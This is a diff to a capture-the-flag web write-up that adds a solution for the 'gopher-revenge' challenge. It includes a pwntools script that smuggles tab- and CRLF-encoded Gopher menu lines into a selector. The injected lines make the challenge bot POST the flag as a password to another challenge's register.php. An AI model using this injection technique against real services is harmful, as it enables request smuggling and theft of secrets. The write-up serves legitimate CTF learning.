@@ -10,6 +10,7 @@ tags: [ctf, ctf writeup, ctf web]
 3 web challenge writeups in this post:
 - [wait-an-eternity](#wait-an-eternity)
 - [go-gopher](#go-gopher)
+- [gopher-revenge](#gopher-revenge) (got first blood on this challenge! Not finishing the detailed writeup, but with a summary)
 
 ## wait-an-eternity
 
@@ -249,3 +250,46 @@ func main() {
 ```
 
 Noticing the string after the 2nd "/" in the selector or "magic string" in the request is included in the response. The bot takes the 3rd item in the response, and I am able to inject into the 1st line. So it is possible to make the selector in the 3rd item being a URL we want, and push the items after the 1st item in the original response further down.
+
+#### Gopher URL
+
+[RFC 4266](https://datatracker.ietf.org/doc/html/rfc4266) specifies the Gopher URI scheme. I then used the information to build the Gopher URL for the Gopher request.
+
+In the URL example
+
+```
+gopher://amt.rs:31290/1/submit/lol
+```
+
+where `1` is the "gophertype", with `/submit/lol` being the "selector string".
+
+### Putting it together
+
+Putting it together and generate the payload with the following Python script:
+
+```python
+from pwn import *
+r = remote('amt.rs', 31290)
+TAB = '%09'
+CRLF = '%0D%0A'
+# url = 'https://cps.amt.rs/register.php'
+urlencoded_url = 'https%3A%2F%2Fcps%2Eamt%2Ers%2Fregister.php'
+url_line_content = f'0S{TAB}{urlencoded_url}{TAB}error.host{TAB}1'
+s = f'/submit/lol{TAB}{TAB}error.host{TAB}1{CRLF}iA{TAB}{TAB}error.host{TAB}1{CRLF}{url_line_content}{CRLF}iA'
+print('[payload] Magic string:', s)
+r.send(s.encode())
+r.send(b'\r\n')
+response = r.clean(timeout=1)
+print('[response] Response:')
+print(response.decode())
+s = s.replace('%', '%25')
+print('[payload] Gopher URL:', f'gopher://amt.rs:31290/1/{s}')
+```
+
+![Payload](/assets/image/amateursctf-web-writeup/gopher-revenge-payload.png)
+
+This results in the bot POST to `https://cps.amt.rs/register.php` with the flag as the password. The URL is for another SQLi challenge (which was worth 0 point because of the solution was leaked), which I did not manage to solve (though I tried to solve it and only the next morning I realised I did not need to solve it and I already had the solution for gopher-revenge). The `/register.php` takes exactly username and password as the POST parameters, and returns a cookie named "token" in the response. The bot then shows the value of the cookie. When authenticated with the cookie, the site shows the password of the user.
+
+![CPS page showing password of the authenticated user](/assets/image/amateursctf-web-writeup/cps-authenticated.png)
+
+Copying the password into the flag submission did not work. I did ask the CTF organisers to confirm the code running on the server for the SQLi challenge is the same as the downloadables, and did not do anything special to the flag. The CTF organisers confirmed the code is the same, and said a few teams have stuck here. They then added "the flag in "flag.txt" is the exact same flag you need to submit" to the challenge description as a hint. Seeing the space showing in the password, I then realised it could have been a "+" in the original flag. I then tried to submit the flag with "+" instead of space, and it worked. I realised as I recently had the issue with "+" in the URL.
